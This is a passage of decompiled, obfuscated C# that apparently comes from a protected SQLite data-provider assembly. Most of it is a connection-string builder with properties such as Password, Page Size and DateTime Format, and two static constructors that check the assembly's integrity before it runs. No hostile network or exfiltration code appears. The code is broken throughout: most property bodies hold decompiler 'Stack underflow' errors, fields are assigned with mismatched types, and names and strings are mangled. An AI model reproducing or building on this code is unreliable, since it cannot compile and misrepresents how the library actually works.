		public readonly long _0001;

		internal _0015(string _0096_0014_0006, string _008E_0014_0006, global::_0006._0016 _0014_0019_0006, long _0016_001B_0006)
		{
			this._0001 = _0096_0014_0006;
			_0002 = _008E_0014_0006;
			this._0001 = _0014_0019_0006;
			_0001 = _0016_001B_0006;
		}
	}
}
namespace _0018
{
	internal sealed class _001D : EventArgs
	{
		public bool _0001;

		internal _001D()
		{
		}

		static _001D()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0004
{
	internal sealed class _0018 : EventArgs
	{
		public readonly string _0001;

		internal _0018(string _001C_001B_0006)
		{
			_0001 = _001C_001B_0006;
		}
	}
}
namespace _0007
{
	internal interface _001B
	{
		void _0001(string _0002, ref Dictionary<string, int> _0003, ref int _0004, ref int _0005, ref int _0006);

		void _0001(string _0002);

		void _0001();

		void _0001(string _0002, object _0003, int _0004);

		object _0001(string _0002, int _0003, out int _0004);
	}
	internal static class _001C
	{
		internal sealed class _0001
		{
			internal readonly Queue<WeakReference> _0001 = new Queue<WeakReference>();

			internal int _0001;

			internal int _0002;

			internal _0001(int _001F_0010, int _0007_001C_0006)
			{
				_0001 = _001F_0010;
				_0002 = _0007_001C_0006;
			}
		}

		internal static readonly object _0001;

		internal static _001B _0001;

		internal static SortedList<string, _0001> _0001;

		internal static int _0001;

		internal static int _0002;

		internal static int _0003;

		static _001C()
		{
			//IL_00ef: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly = (Assembly)/*Error near IL_00f5: Stack underflow*/;
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (!global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) || !flag || !global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				throw new SecurityException(_0080._0014._0001(107396706));
			}
			_001C._0001 = new object();
			_001C._0001 = null;
			_001C._0001 = new SortedList<string, _0001>(_007F_0004._008D_0008());
			_001C._0001 = 1;
			_0002 = 0;
			_0003 = 0;
		}
	}
}
namespace _0006
{
	[DefaultMember("Item")]
	[DefaultProperty("DataSource")]
	internal sealed class _0017 : DbConnectionStringBuilder
	{
		private Hashtable m__0001;

		[DefaultValue(3)]
		[Browsable(true)]
		public int Version
		{
			get
			{
				//IL_002a: Incompatible stack heights: 0 vs 2
				//IL_0031: Incompatible stack heights: 0 vs 1
				//IL_0038: Incompatible stack heights: 0 vs 1
				_ = _0081_0004._007E_008F_0008;
				_0080._0014._0001(107398300);
				object obj = default(object);
				/*Error near IL_0038: Stack underflow*/((object)/*Error near IL_0038: Stack underflow*/, (string)/*Error near IL_0038: Stack underflow*/, ref obj);
				return _0082_0004._0090_0008(obj, _008F_0003._008C_0007());
			}
			set
			{
				//IL_0003: Invalid comparison between Unknown and I4
				//IL_0026: Incompatible stack heights: 0 vs 1
				//IL_002d: Incompatible stack heights: 0 vs 1
				//IL_0030: Incompatible stack heights: 0 vs 2
				if ((int)/*Error near IL_0005: Stack underflow*/ != 3)
				{
					new NotSupportedException();
					throw /*Error near IL_0008: Stack underflow*/;
				}
				_ = _0083_0004._007E_0091_0008;
				string text = _0080._0014._0001(107398300);
				object obj = value;
				/*Error near IL_0024: Stack underflow*/((object)/*Error near IL_0024: Stack underflow*/, text, obj);
			}
		}

		[Browsable(true)]
		[DisplayName("Synchronous")]
		[DefaultValue(global::_001B._0019._0001)]
		public global::_001B._0019 SyncMode
		{
			get
			{
				//IL_004d: Incompatible stack heights: 0 vs 2
				//IL_0054: Incompatible stack heights: 0 vs 1
				//IL_005b: Incompatible stack heights: 0 vs 1
				_ = _0081_0004._007E_008F_0008;
				_0080._0014._0001(107398255);
				object obj = default(object);
				/*Error near IL_005b: Stack underflow*/((object)/*Error near IL_005b: Stack underflow*/, (string)/*Error near IL_005b: Stack underflow*/, ref obj);
				if (obj is string)
				{
					return (global::_001B._0019)_0086_0004._007E_0096_0008(_0084_0004._0095_0008(_0091._0080_0004(typeof(global::_001B._0019).TypeHandle)), obj);
				}
				return (global::_001B._0019)obj;
			}
			set
			{
				//IL_001c: Incompatible stack heights: 0 vs 2
				//IL_0023: Incompatible stack heights: 0 vs 1
				//IL_0026: Incompatible stack heights: 0 vs 1
				_ = _0083_0004._007E_0091_0008;
				_0080._0014._0001(107398255);
				object obj = (global::_001B._0019)/*Error near IL_0015: Stack underflow*/;
				/*Error near IL_001a: Stack underflow*/((object)/*Error near IL_001a: Stack underflow*/, (string)/*Error near IL_001a: Stack underflow*/, obj);
			}
		}

		[DisplayName("Use UTF-16 Encoding")]
		[Browsable(true)]
		[DefaultValue(false)]
		public bool UseUTF16Encoding
		{
			get
			{
				//IL_001b: Incompatible stack heights: 0 vs 2
				//IL_0022: Incompatible stack heights: 0 vs 1
				//IL_0029: Incompatible stack heights: 0 vs 1
				_ = _0081_0004._007E_008F_0008;
				_0080._0014._0001(107398270);
				object obj = default(object);
				/*Error near IL_0029: Stack underflow*/((object)/*Error near IL_0029: Stack underflow*/, (string)/*Error near IL_0029: Stack underflow*/, ref obj);
				return global::_0011._0018._0001(obj);
			}
			set
			{
				//IL_001c: Incompatible stack heights: 0 vs 2
				//IL_0023: Incompatible stack heights: 0 vs 1
				//IL_0026: Incompatible stack heights: 0 vs 1
				_ = _0083_0004._007E_0091_0008;
				_0080._0014._0001(107398270);
				object obj = (byte)/*Error near IL_0015: Stack underflow*/ != 0;
				/*Error near IL_001a: Stack underflow*/((object)/*Error near IL_001a: Stack underflow*/, (string)/*Error near IL_001a: Stack underflow*/, obj);
			}
		}

		[Browsable(true)]
		[DefaultValue(false)]
		public bool Pooling
		{
			get
			{
				//IL_001b: Incompatible stack heights: 0 vs 2
				//IL_0022: Incompatible stack heights: 0 vs 1
				//IL_0029: Incompatible stack heights: 0 vs 1
				_ = _0081_0004._007E_008F_0008;
				_0080._0014._0001(107398213);
				object obj = default(object);
				/*Error near IL_0029: Stack underflow*/((object)/*Error near IL_0029: Stack underflow*/, (string)/*Error near IL_0029: Stack underflow*/, ref obj);
				return global::_0011._0018._0001(obj);
			}
			set
			{
				//IL_001c: Incompatible stack heights: 0 vs 2
				//IL_0023: Incompatible stack heights: 0 vs 1
				//IL_0026: Incompatible stack heights: 0 vs 1
				_ = _0083_0004._007E_0091_0008;
				_0080._0014._0001(107398213);
				object obj = (byte)/*Error near IL_0015: Stack underflow*/ != 0;
				/*Error near IL_001a: Stack underflow*/((object)/*Error near IL_001a: Stack underflow*/, (string)/*Error near IL_001a: Stack underflow*/, obj);
			}
		}

		[DisplayName("Binary GUID")]
		[Browsable(true)]
		[DefaultValue(true)]
		public bool BinaryGUID
		{
			get
			{
				//IL_001b: Incompatible stack heights: 0 vs 2
				//IL_0022: Incompatible stack heights: 0 vs 1
				//IL_0029: Incompatible stack heights: 0 vs 1
				_ = _0081_0004._007E_008F_0008;
				_0080._0014._0001(107398232);
				object obj = default(object);
				/*Error near IL_0029: Stack underflow*/((object)/*Error near IL_0029: Stack underflow*/, (string)/*Error near IL_0029: Stack underflow*/, ref obj);
				return global::_0011._0018._0001(obj);
			}
			set
			{
				//IL_001c: Incompatible stack heights: 0 vs 2
				//IL_0023: Incompatible stack heights: 0 vs 1
				//IL_0026: Incompatible stack heights: 0 vs 1
				_ = _0083_0004._007E_0091_0008;
				_0080._0014._0001(107398232);
				object obj = (byte)/*Error near IL_0015: Stack underflow*/ != 0;
				/*Error near IL_001a: Stack underflow*/((object)/*Error near IL_001a: Stack underflow*/, (string)/*Error near IL_001a: Stack underflow*/, obj);
			}
		}

		[DefaultValue("")]
		[Browsable(true)]
		[DisplayName("Data Source")]
		public string DataSource
		{
			get
			{
				//IL_0025: Incompatible stack heights: 0 vs 2
				//IL_002c: Incompatible stack heights: 0 vs 1
				//IL_0033: Incompatible stack heights: 0 vs 1
				_ = _0081_0004._007E_008F_0008;
				_0080._0014._0001(107398183);
				object obj = default(object);
				/*Error near IL_0033: Stack underflow*/((object)/*Error near IL_0033: Stack underflow*/, (string)/*Error near IL_0033: Stack underflow*/, ref obj);
				if (obj == null)
				{
					return null;
				}
				return global::_0002._007E_0006(obj);
			}
			set
			{
				//IL_0017: Incompatible stack heights: 0 vs 2
				//IL_001e: Incompatible stack heights: 0 vs 1
				//IL_0021: Incompatible stack heights: 0 vs 1
				_ = _0083_0004._007E_0091_0008;
				_0080._0014._0001(107398183);
				/*Error near IL_0015: Stack underflow*/((object)/*Error near IL_0015: Stack underflow*/, (string)/*Error near IL_0015: Stack underflow*/, (object)/*Error near IL_0015: Stack underflow*/);
			}
		}

		[DefaultValue(null)]
		[Browsable(true)]
		[DisplayName("URI")]
		public string Uri
		{
			get
			{
				//IL_0025: Incompatible stack heights: 0 vs 2
				//IL_002c: Incompatible stack heights: 0 vs 1
				//IL_0033: Incompatible stack heights: 0 vs 1
				_ = _0081_0004._007E_008F_0008;
				_0080._0014._0001(107398198);
				object obj = default(object);
				/*Error near IL_0033: Stack underflow*/((object)/*Error near IL_0033: Stack underflow*/, (string)/*Error near IL_0033: Stack underflow*/, ref obj);
				if (obj == null)
				{
					return null;
				}
				return global::_0002._007E_0006(obj);
			}
			set
			{
				//IL_0017: Incompatible stack heights: 0 vs 2
				//IL_001e: Incompatible stack heights: 0 vs 1
				//IL_0021: Incompatible stack heights: 0 vs 1
				_ = _0083_0004._007E_0091_0008;
				_0080._0014._0001(107398198);
				/*Error near IL_0015: Stack underflow*/((object)/*Error near IL_0015: Stack underflow*/, (string)/*Error near IL_0015: Stack underflow*/, (object)/*Error near IL_0015: Stack underflow*/);
			}
		}

		[DisplayName("Full URI")]
		[DefaultValue(null)]
		[Browsable(true)]
		public string FullUri
		{
			get
			{
				//IL_0025: Incompatible stack heights: 0 vs 2
				//IL_002c: Incompatible stack heights: 0 vs 1
				//IL_0033: Incompatible stack heights: 0 vs 1
				_ = _0081_0004._007E_008F_0008;
				_0080._0014._0001(107398193);
				object obj = default(object);
				/*Error near IL_0033: Stack underflow*/((object)/*Error near IL_0033: Stack underflow*/, (string)/*Error near IL_0033: Stack underflow*/, ref obj);
				if (obj == null)
				{
					return null;
				}
				return global::_0002._007E_0006(obj);
			}
			set
			{
				//IL_0017: Incompatible stack heights: 0 vs 2
				//IL_001e: Incompatible stack heights: 0 vs 1
				//IL_0021: Incompatible stack heights: 0 vs 1
				_ = _0083_0004._007E_0091_0008;
				_0080._0014._0001(107398193);
				/*Error near IL_0015: Stack underflow*/((object)/*Error near IL_0015: Stack underflow*/, (string)/*Error near IL_0015: Stack underflow*/, (object)/*Error near IL_0015: Stack underflow*/);
			}
		}

		[DisplayName("Default Timeout")]
		[Browsable(true)]
		[DefaultValue(30)]
		public int DefaultTimeout
		{
			get
			{
				//IL_002a: Incompatible stack heights: 0 vs 2
				//IL_0031: Incompatible stack heights: 0 vs 1
				//IL_0038: Incompatible stack heights: 0 vs 1
				_ = _0081_0004._007E_008F_0008;
				_0080._0014._0001(107398148);
				object obj = default(object);
				/*Error near IL_0038: Stack underflow*/((object)/*Error near IL_0038: Stack underflow*/, (string)/*Error near IL_0038: Stack underflow*/, ref obj);
				return _0082_0004._0090_0008(obj, _008F_0003._008C_0007());
			}
			set
			{
				//IL_001c: Incompatible stack heights: 0 vs 2
				//IL_0023: Incompatible stack heights: 0 vs 1
				//IL_0026: Incompatible stack heights: 0 vs 1
				_ = _0083_0004._007E_0091_0008;
				_0080._0014._0001(107398148);
				object obj = (int)/*Error near IL_0015: Stack underflow*/;
				/*Error near IL_001a: Stack underflow*/((object)/*Error near IL_001a: Stack underflow*/, (string)/*Error near IL_001a: Stack underflow*/, obj);
			}
		}

		[DefaultValue(0)]
		[Browsable(true)]
		[DisplayName("Busy Timeout")]
		public int BusyTimeout
		{
			get
			{
				//IL_002a: Incompatible stack heights: 0 vs 2
				//IL_0031: Incompatible stack heights: 0 vs 1
				//IL_0038: Incompatible stack heights: 0 vs 1
				_ = _0081_0004._007E_008F_0008;
				_0080._0014._0001(107398639);
				object obj = default(object);
				/*Error near IL_0038: Stack underflow*/((object)/*Error near IL_0038: Stack underflow*/, (string)/*Error near IL_0038: Stack underflow*/, ref obj);
				return _0082_0004._0090_0008(obj, _008F_0003._008C_0007());
			}
			set
			{
				//IL_001c: Incompatible stack heights: 0 vs 2
				//IL_0023: Incompatible stack heights: 0 vs 1
				//IL_0026: Incompatible stack heights: 0 vs 1
				_ = _0083_0004._007E_0091_0008;
				_0080._0014._0001(107398639);
				object obj = (int)/*Error near IL_0015: Stack underflow*/;
				/*Error near IL_001a: Stack underflow*/((object)/*Error near IL_001a: Stack underflow*/, (string)/*Error near IL_001a: Stack underflow*/, obj);
			}
		}

		[DefaultValue(3)]
		[Browsable(true)]
		[DisplayName("Prepare Retries")]
		public int PrepareRetries
		{
			get
			{
				//IL_002a: Incompatible stack heights: 0 vs 2
				//IL_0031: Incompatible stack heights: 0 vs 1
				//IL_0038: Incompatible stack heights: 0 vs 1
				_ = _0081_0004._007E_008F_0008;
				_0080._0014._0001(107398654);
				object obj = default(object);
				/*Error near IL_0038: Stack underflow*/((object)/*Error near IL_0038: Stack underflow*/, (string)/*Error near IL_0038: Stack underflow*/, ref obj);
				return _0082_0004._0090_0008(obj, _008F_0003._008C_0007());
			}
			set
			{
				//IL_001c: Incompatible stack heights: 0 vs 2
				//IL_0023: Incompatible stack heights: 0 vs 1
				//IL_0026: Incompatible stack heights: 0 vs 1
				_ = _0083_0004._007E_0091_0008;
				_0080._0014._0001(107398654);
				object obj = (int)/*Error near IL_0015: Stack underflow*/;
				/*Error near IL_001a: Stack underflow*/((object)/*Error near IL_001a: Stack underflow*/, (string)/*Error near IL_001a: Stack underflow*/, obj);
			}
		}

		[DefaultValue(0)]
		[DisplayName("Progress Ops")]
		[Browsable(true)]
		public int ProgressOps
		{
			get
			{
				//IL_002a: Incompatible stack heights: 0 vs 2
				//IL_0031: Incompatible stack heights: 0 vs 1
				//IL_0038: Incompatible stack heights: 0 vs 1
				_ = _0081_0004._007E_008F_0008;
				_0080._0014._0001(107398601);
				object obj = default(object);
				/*Error near IL_0038: Stack underflow*/((object)/*Error near IL_0038: Stack underflow*/, (string)/*Error near IL_0038: Stack underflow*/, ref obj);
				return _0082_0004._0090_0008(obj, _008F_0003._008C_0007());
			}
			set
			{
				//IL_001c: Incompatible stack heights: 0 vs 2
				//IL_0023: Incompatible stack heights: 0 vs 1
				//IL_0026: Incompatible stack heights: 0 vs 1
				_ = _0083_0004._007E_0091_0008;
				_0080._0014._0001(107398601);
				object obj = (int)/*Error near IL_0015: Stack underflow*/;
				/*Error near IL_001a: Stack underflow*/((object)/*Error near IL_001a: Stack underflow*/, (string)/*Error near IL_001a: Stack underflow*/, obj);
			}
		}

		[Browsable(true)]
		[DefaultValue(true)]
		public bool Enlist
		{
			get
			{
				//IL_001b: Incompatible stack heights: 0 vs 2
				//IL_0022: Incompatible stack heights: 0 vs 1
				//IL_0029: Incompatible stack heights: 0 vs 1
				_ = _0081_0004._007E_008F_0008;
				_0080._0014._0001(107398616);
				object obj = default(object);
				/*Error near IL_0029: Stack underflow*/((object)/*Error near IL_0029: Stack underflow*/, (string)/*Error near IL_0029: Stack underflow*/, ref obj);
				return global::_0011._0018._0001(obj);
			}
			set
			{
				//IL_001c: Incompatible stack heights: 0 vs 2
				//IL_0023: Incompatible stack heights: 0 vs 1
				//IL_0026: Incompatible stack heights: 0 vs 1
				_ = _0083_0004._007E_0091_0008;
				_0080._0014._0001(107398616);
				object obj = (byte)/*Error near IL_0015: Stack underflow*/ != 0;
				/*Error near IL_001a: Stack underflow*/((object)/*Error near IL_001a: Stack underflow*/, (string)/*Error near IL_001a: Stack underflow*/, obj);
			}
		}

		[Browsable(true)]
		[DefaultValue(false)]
		[DisplayName("Fail If Missing")]
		public bool FailIfMissing
		{
			get
			{
				//IL_001b: Incompatible stack heights: 0 vs 2
				//IL_0022: Incompatible stack heights: 0 vs 1
				//IL_0029: Incompatible stack heights: 0 vs 1
				_ = _0081_0004._007E_008F_0008;
				_0080._0014._0001(107398575);
				object obj = default(object);
				/*Error near IL_0029: Stack underflow*/((object)/*Error near IL_0029: Stack underflow*/, (string)/*Error near IL_0029: Stack underflow*/, ref obj);
				return global::_0011._0018._0001(obj);
			}
			set
			{
				//IL_001c: Incompatible stack heights: 0 vs 2
				//IL_0023: Incompatible stack heights: 0 vs 1
				//IL_0026: Incompatible stack heights: 0 vs 1
				_ = _0083_0004._007E_0091_0008;
				_0080._0014._0001(107398575);
				object obj = (byte)/*Error near IL_0015: Stack underflow*/ != 0;
				/*Error near IL_001a: Stack underflow*/((object)/*Error near IL_001a: Stack underflow*/, (string)/*Error near IL_001a: Stack underflow*/, obj);
			}
		}

		[DisplayName("Legacy Format")]
		[Browsable(true)]
		[DefaultValue(false)]
		public bool LegacyFormat
		{
			get
			{
				//IL_001b: Incompatible stack heights: 0 vs 2
				//IL_0022: Incompatible stack heights: 0 vs 1
				//IL_0029: Incompatible stack heights: 0 vs 1
				_ = _0081_0004._007E_008F_0008;
				_0080._0014._0001(107398586);
				object obj = default(object);
				/*Error near IL_0029: Stack underflow*/((object)/*Error near IL_0029: Stack underflow*/, (string)/*Error near IL_0029: Stack underflow*/, ref obj);
				return global::_0011._0018._0001(obj);
			}
			set
			{
				//IL_001c: Incompatible stack heights: 0 vs 2
				//IL_0023: Incompatible stack heights: 0 vs 1
				//IL_0026: Incompatible stack heights: 0 vs 1
				_ = _0083_0004._007E_0091_0008;
				_0080._0014._0001(107398586);
				object obj = (byte)/*Error near IL_0015: Stack underflow*/ != 0;
				/*Error near IL_001a: Stack underflow*/((object)/*Error near IL_001a: Stack underflow*/, (string)/*Error near IL_001a: Stack underflow*/, obj);
			}
		}

		[Browsable(true)]
		[DefaultValue(false)]
		[DisplayName("Read Only")]
		public bool ReadOnly
		{
			get
			{
				//IL_001b: Incompatible stack heights: 0 vs 2
				//IL_0022: Incompatible stack heights: 0 vs 1
				//IL_0029: Incompatible stack heights: 0 vs 1
				_ = _0081_0004._007E_008F_0008;
				_0080._0014._0001(107398533);
				object obj = default(object);
				/*Error near IL_0029: Stack underflow*/((object)/*Error near IL_0029: Stack underflow*/, (string)/*Error near IL_0029: Stack underflow*/, ref obj);
				return global::_0011._0018._0001(obj);
			}
			set
			{
				//IL_001c: Incompatible stack heights: 0 vs 2
				//IL_0023: Incompatible stack heights: 0 vs 1
				//IL_0026: Incompatible stack heights: 0 vs 1
				_ = _0083_0004._007E_0091_0008;
				_0080._0014._0001(107398533);
				object obj = (byte)/*Error near IL_0015: Stack underflow*/ != 0;
				/*Error near IL_001a: Stack underflow*/((object)/*Error near IL_001a: Stack underflow*/, (string)/*Error near IL_001a: Stack underflow*/, obj);
			}
		}

		[DefaultValue("")]
		[PasswordPropertyText(true)]
		[Browsable(true)]
		public string Password
		{
			get
			{
				//IL_0025: Incompatible stack heights: 0 vs 2
				//IL_002c: Incompatible stack heights: 0 vs 1
				//IL_0033: Incompatible stack heights: 0 vs 1
				_ = _0081_0004._007E_008F_0008;
				_0080._0014._0001(107398552);
				object obj = default(object);
				/*Error near IL_0033: Stack underflow*/((object)/*Error near IL_0033: Stack underflow*/, (string)/*Error near IL_0033: Stack underflow*/, ref obj);
				if (obj == null)
				{
					return null;
				}
				return global::_0002._007E_0006(obj);
			}
			set
			{
				//IL_0017: Incompatible stack heights: 0 vs 2
				//IL_001e: Incompatible stack heights: 0 vs 1
				//IL_0021: Incompatible stack heights: 0 vs 1
				_ = _0083_0004._007E_0091_0008;
				_0080._0014._0001(107398552);
				/*Error near IL_0015: Stack underflow*/((object)/*Error near IL_0015: Stack underflow*/, (string)/*Error near IL_0015: Stack underflow*/, (object)/*Error near IL_0015: Stack underflow*/);
			}
		}

		[PasswordPropertyText(true)]
		[Browsable(true)]
		[DisplayName("Hexadecimal Password")]
		[DefaultValue(null)]
		public byte[] HexPassword
		{
			get
			{
				//IL_0035: Incompatible stack heights: 0 vs 2
				//IL_003c: Incompatible stack heights: 0 vs 1
				//IL_0043: Incompatible stack heights: 0 vs 1
				_ = _0081_0004._007E_008F_0008;
				_0080._0014._0001(107398507);
				object obj = default(object);
				/*Error near IL_0043: Stack underflow*/((object)/*Error near IL_0043: Stack underflow*/, (string)/*Error near IL_0043: Stack underflow*/, ref obj);
				if ((int)/*Error near IL_0014: Stack underflow*/ != 0)
				{
					if (obj is string)
					{
						return global::_0011._0018._0001((string)obj);
					}
					if (obj != null)
					{
						return (byte[])obj;
					}
				}
				return null;
			}
			set
			{
				//IL_001c: Incompatible stack heights: 0 vs 2
				//IL_0023: Incompatible stack heights: 0 vs 1
				//IL_0026: Incompatible stack heights: 0 vs 1
				_ = _0083_0004._007E_0091_0008;
				_0080._0014._0001(107398507);
				string text = global::_0011._0018._0001((byte[])/*Error near IL_0015: Stack underflow*/);
				/*Error near IL_001a: Stack underflow*/((object)/*Error near IL_001a: Stack underflow*/, (string)/*Error near IL_001a: Stack underflow*/, text);
			}
		}

		[DefaultValue(4096)]
		[Browsable(true)]
		[DisplayName("Page Size")]
		public int PageSize
		{
			get
			{
				//IL_002a: Incompatible stack heights: 0 vs 2
				//IL_0031: Incompatible stack heights: 0 vs 1
				//IL_0038: Incompatible stack heights: 0 vs 1
				_ = _0081_0004._007E_008F_0008;
				_0080._0014._0001(107398522);
				object obj = default(object);
				/*Error near IL_0038: Stack underflow*/((object)/*Error near IL_0038: Stack underflow*/, (string)/*Error near IL_0038: Stack underflow*/, ref obj);
				return _0082_0004._0090_0008(obj, _008F_0003._008C_0007());
			}
			set
			{
				//IL_001c: Incompatible stack heights: 0 vs 2
				//IL_0023: Incompatible stack heights: 0 vs 1
				//IL_0026: Incompatible stack heights: 0 vs 1
				_ = _0083_0004._007E_0091_0008;
				_0080._0014._0001(107398522);
				object obj = (int)/*Error near IL_0015: Stack underflow*/;
				/*Error near IL_001a: Stack underflow*/((object)/*Error near IL_001a: Stack underflow*/, (string)/*Error near IL_001a: Stack underflow*/, obj);
			}
		}

		[Browsable(true)]
		[DefaultValue(0)]
		[DisplayName("Maximum Page Count")]
		public int MaxPageCount
		{
			get
			{
				//IL_002a: Incompatible stack heights: 0 vs 2
				//IL_0031: Incompatible stack heights: 0 vs 1
				//IL_0038: Incompatible stack heights: 0 vs 1
				_ = _0081_0004._007E_008F_0008;
				_0080._0014._0001(107398477);
				object obj = default(object);
				/*Error near IL_0038: Stack underflow*/((object)/*Error near IL_0038: Stack underflow*/, (string)/*Error near IL_0038: Stack underflow*/, ref obj);
				return _0082_0004._0090_0008(obj, _008F_0003._008C_0007());
			}
			set
			{
				//IL_001c: Incompatible stack heights: 0 vs 2
				//IL_0023: Incompatible stack heights: 0 vs 1
				//IL_0026: Incompatible stack heights: 0 vs 1
				_ = _0083_0004._007E_0091_0008;
				_0080._0014._0001(107398477);
				object obj = (int)/*Error near IL_0015: Stack underflow*/;
				/*Error near IL_001a: Stack underflow*/((object)/*Error near IL_001a: Stack underflow*/, (string)/*Error near IL_001a: Stack underflow*/, obj);
			}
		}

		[DefaultValue(-2000)]
		[DisplayName("Cache Size")]
		[Browsable(true)]
		public int CacheSize
		{
			get
			{
				//IL_002a: Incompatible stack heights: 0 vs 2
				//IL_0031: Incompatible stack heights: 0 vs 1
				//IL_0038: Incompatible stack heights: 0 vs 1
				_ = _0081_0004._007E_008F_0008;
				_0080._0014._0001(107398488);
				object obj = default(object);
				/*Error near IL_0038: Stack underflow*/((object)/*Error near IL_0038: Stack underflow*/, (string)/*Error near IL_0038: Stack underflow*/, ref obj);
				return _0082_0004._0090_0008(obj, _008F_0003._008C_0007());
			}
			set
			{
				//IL_001c: Incompatible stack heights: 0 vs 2
				//IL_0023: Incompatible stack heights: 0 vs 1
				//IL_0026: Incompatible stack heights: 0 vs 1
				_ = _0083_0004._007E_0091_0008;
				_0080._0014._0001(107398488);
				object obj = (int)/*Error near IL_0015: Stack underflow*/;
				/*Error near IL_001a: Stack underflow*/((object)/*Error near IL_001a: Stack underflow*/, (string)/*Error near IL_001a: Stack underflow*/, obj);
			}
		}

		[DefaultValue(SQLiteDateFormats.ISO8601)]
		[DisplayName("DateTime Format")]
		[Browsable(true)]
		public SQLiteDateFormats DateTimeFormat
		{
			get
			{
				//IL_0053: Incompatible stack heights: 0 vs 2
				//IL_005a: Incompatible stack heights: 0 vs 1
				//IL_0061: Incompatible stack heights: 0 vs 1
				_ = _0081_0004._007E_008F_0008;
				_0080._0014._0001(107398439);
				object obj = default(object);
				/*Error near IL_0061: Stack underflow*/((object)/*Error near IL_0061: Stack underflow*/, (string)/*Error near IL_0061: Stack underflow*/, ref obj);
				if ((int)/*Error near IL_0014: Stack underflow*/ != 0)
				{
					if (obj is SQLiteDateFormats)
					{
						return (SQLiteDateFormats)obj;
					}
					if (obj != null)
					{
						return (SQLiteDateFormats)_0086_0004._007E_0096_0008(_0084_0004._0095_0008(_0091._0080_0004(typeof(SQLiteDateFormats).TypeHandle)), obj);
					}
				}
				return SQLiteDateFormats.ISO8601;
			}
			set
			{
				//IL_001c: Incompatible stack heights: 0 vs 2
				//IL_0023: Incompatible stack heights: 0 vs 1
				//IL_0026: Incompatible stack heights: 0 vs 1
				_ = _0083_0004._007E_0091_0008;
				_0080._0014._0001(107398439);
				object obj = (SQLiteDateFormats)/*Error near IL_0015: Stack underflow*/;
				/*Error near IL_001a: Stack underflow*/((object)/*Error near IL_001a: Stack underflow*/, (string)/*Error near IL_001a: Stack underflow*/, obj);
			}
		}

		[Browsable(true)]
		[DisplayName("DateTime Kind")]
		[DefaultValue(DateTimeKind.Unspecified)]
		public DateTimeKind DateTimeKind
		{
			get
			{
				//IL_0053: Incompatible stack heights: 0 vs 2
				//IL_005a: Incompatible stack heights: 0 vs 1
				//IL_0061: Incompatible stack heights: 0 vs 1
				_ = _0081_0004._007E_008F_0008;
				_0080._0014._0001(107398450);
				object obj = default(object);
				/*Error near IL_0061: Stack underflow*/((object)/*Error near IL_0061: Stack underflow*/, (string)/*Error near IL_0061: Stack underflow*/, ref obj);
				if ((int)/*Error near IL_0014: Stack underflow*/ != 0)
				{
					if (obj is DateTimeKind)
					{
						return (DateTimeKind)obj;
					}
					if (obj != null)
					{
						return (DateTimeKind)_0086_0004._007E_0096_0008(_0084_0004._0095_0008(_0091._0080_0004(typeof(DateTimeKind).TypeHandle)), obj);
					}
				}
				return DateTimeKind.Unspecified;
			}
			set
			{
				//IL_001c: Incompatible stack heights: 0 vs 2
				//IL_0023: Incompatible stack heights: 0 vs 1
				//IL_0026: Incompatible stack heights: 0 vs 1
				_ = _0083_0004._007E_0091_0008;
				_0080._0014._0001(107398450);
				object obj = (DateTimeKind)/*Error near IL_0015: Stack underflow*/;
				/*Error near IL_001a: Stack underflow*/((object)/*Error near IL_001a: Stack underflow*/, (string)/*Error near IL_001a: Stack underflow*/, obj);
			}
		}

		[DisplayName("DateTime Format String")]
		[DefaultValue(null)]
		[Browsable(true)]
		public string DateTimeFormatString
		{
			get
			{
				//IL_0035: Incompatible stack heights: 0 vs 2
				//IL_003c: Incompatible stack heights: 0 vs 1
				//IL_0043: Incompatible stack heights: 0 vs 1
				_ = _0081_0004._007E_008F_0008;
				_0080._0014._0001(107398401);
				object obj = default(object);
				/*Error near IL_0043: Stack underflow*/((object)/*Error near IL_0043: Stack underflow*/, (string)/*Error near IL_0043: Stack underflow*/, ref obj);
				if ((int)/*Error near IL_0014: Stack underflow*/ != 0)
				{
					if (obj is string)
					{
						return (string)obj;
					}
					if (obj != null)
					{
						return global::_0002._007E_0006(obj);
					}
				}
				return null;
			}
			set
			{
				//IL_0017: Incompatible stack heights: 0 vs 2
				//IL_001e: Incompatible stack heights: 0 vs 1
				//IL_0021: Incompatible stack heights: 0 vs 1
				_ = _0083_0004._007E_0091_0008;
				_0080._0014._0001(107398401);
				/*Error near IL_0015: Stack underflow*/((object)/*Error near IL_0015: Stack underflow*/, (string)/*Error near IL_0015: Stack underflow*/, (object)/*Error near IL_0015: Stack underflow*/);
			}
		}

		[DefaultValue("sqlite_default_schema")]
		[Browsable(true)]
		[DisplayName("Base Schema Name")]
		public string BaseSchemaName
		{
			get
			{
				//IL_0035: Incompatible stack heights: 0 vs 2
				//IL_003c: Incompatible stack heights: 0 vs 1
				//IL_0043: Incompatible stack heights: 0 vs 1
				_ = _0081_0004._007E_008F_0008;
				_0080._0014._0001(107397860);
				object obj = default(object);
				/*Error near IL_0043: Stack underflow*/((object)/*Error near IL_0043: Stack underflow*/, (string)/*Error near IL_0043: Stack underflow*/, ref obj);
				if ((int)/*Error near IL_0014: Stack underflow*/ != 0)
				{
					if (obj is string)
					{
						return (string)obj;
					}
					if (obj != null)
					{
						return global::_0002._007E_0006(obj);
					}
				}
				return null;
			}
			set
			{
				//IL_0017: Incompatible stack heights: 0 vs 2
				//IL_001e: Incompatible stack heights: 0 vs 1
				//IL_0021: Incompatible stack heights: 0 vs 1
				_ = _0083_0004._007E_0091_0008;
				_0080._0014._0001(107397860);
